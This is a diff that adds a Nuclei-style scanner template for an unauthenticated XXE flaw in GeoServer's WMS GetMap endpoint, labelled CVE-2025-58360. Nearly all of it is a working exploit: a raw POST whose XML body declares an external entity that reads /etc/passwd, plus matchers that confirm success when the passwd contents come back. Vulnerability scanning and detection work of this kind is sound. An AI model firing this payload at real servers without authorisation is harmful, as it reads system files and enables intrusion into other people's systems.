@@ -1,0 +1,45 @@
+id: GeoServer-GetMap-XXE
+
+info:
+  name: GeoServer GetMap 未授权XXE注入漏洞(CVE-2025-58360)
+  author: HuanXiong
+  severity: medium
+http:
+  - raw:
+      - |-
+        POST /geoserver/wms?service=WMS&version=1.3.0&request=GetMap&width=100&height=100&format=image/png&bbox=-180,-90,180,90 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Length: 372
+        Content-Type: application/xml
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE StyledLayerDescriptor [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        <StyledLayerDescriptor version="1.0.0">
+            <NamedLayer>
+                <Name>&xxe;</Name>
+            </NamedLayer>
+        </StyledLayerDescriptor>
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - root:x
+      - type: word
+        part: body
+        words:
+          - bin:x
+      - type: word
+        part: body
+        words:
+          - /root:/bin/bash
+    
+    matchers-condition: and
